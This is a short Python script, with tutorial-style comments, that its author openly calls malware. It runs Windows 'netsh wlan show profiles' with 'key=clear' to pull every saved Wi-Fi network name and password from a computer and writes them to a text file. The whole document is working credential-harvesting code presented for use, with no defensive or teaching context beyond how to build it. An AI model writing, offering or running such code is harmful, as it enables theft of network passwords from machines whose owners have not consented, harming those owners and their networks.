#Open terminal, use "netsh wlan show profiles". You'll see the list of every wifi router you've ever connected to.
#Now pick one of the routers, for example router_name router; Use "netsh wlan show profiles router_name key=clear". You'll see router_name's password in Security Settings / Key Content section.
#The goal is to write a malware, so that when you run it on a computer, extracts all the passwords the computer has ever connected to and saves it as a .txt file for you.

#Fisrt we'll import a library that can run commands in terminal
import subprocess

#A file to save all our info on it
passwords_file = open ("passwords.txt" , "w")

#A code to gain the list of all wifi router names in "netsh wlan show profiles" command.
output_1 = subprocess.check_output("netsh wlan show profiles".split(" ")).decode("utf-8").split("\n")
initial_list  = [i for i in output_1 if "All User Profile" in i]

#Getting rid of all spaces and extra stuff, then running "netsh wlan show profiles Router_name key=clear" command.
for i in initial_list:
    try:
        router_name = i.split(":")[1].replace("\r", "")
        router_name = router_name.strip()
        #running "netsh wlan show profiles Router_name key=clear" command and making a list.
        output_2 = subprocess.check_output(["netsh", "wlan", "show", "profiles", router_name, "key=clear"]).decode("utf-8").split("\n")
        seccondary_list = [i for i in output_2 if "Key Content" in i]
        router_password = str(seccondary_list).split("Key Content")[1].strip()
        #Getting rid of "\r']" at the end of each password
        router_password = router_password[:-4]
        #Writing router's name and password on the .txt file
        passwords_file.write(router_name + router_password + "\n")
    except:
        None

passwords_file.close()